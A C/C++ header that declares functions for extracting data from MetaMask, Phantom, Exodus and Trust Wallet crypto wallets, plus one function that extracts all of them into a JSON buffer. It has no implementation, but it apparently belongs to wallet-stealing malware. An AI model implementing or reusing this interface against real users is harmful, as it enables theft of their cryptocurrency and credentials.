#pragma once

#ifdef __cplusplus
extern "C" {
#endif

// Cryptocurrency Wallet Extraction Functions
// These functions extract wallet data from various crypto applications

/**
 * Extract MetaMask wallet data
 * @param outputBuffer Buffer to store extracted JSON data
 * @param bufferSize Size of the output buffer
 * @return true if data was successfully extracted
 */
bool ExtractMetaMaskData(char* outputBuffer, int bufferSize);

/**
 * Extract Phantom wallet data (Solana)
 * @param outputBuffer Buffer to store extracted JSON data
 * @param bufferSize Size of the output buffer
 * @return true if data was successfully extracted
 */
bool ExtractPhantomData(char* outputBuffer, int bufferSize);

/**
 * Extract Exodus wallet data
 * @param outputBuffer Buffer to store extracted JSON data
 * @param bufferSize Size of the output buffer
 * @return true if data was successfully extracted
 */
bool ExtractExodusData(char* outputBuffer, int bufferSize);

/**
 * Extract Trust Wallet data
 * @param outputBuffer Buffer to store extracted JSON data
 * @param bufferSize Size of the output buffer
 * @return true if data was successfully extracted
 */
bool ExtractTrustWalletData(char* outputBuffer, int bufferSize);

/**
 * Extract all supported crypto wallets
 * @param outputBuffer Buffer to store combined JSON data
 * @param bufferSize Size of the output buffer
 * @return number of wallets successfully extracted
 */
int ExtractAllCryptoWallets(char* outputBuffer, int bufferSize);

#ifdef __cplusplus
}
#endif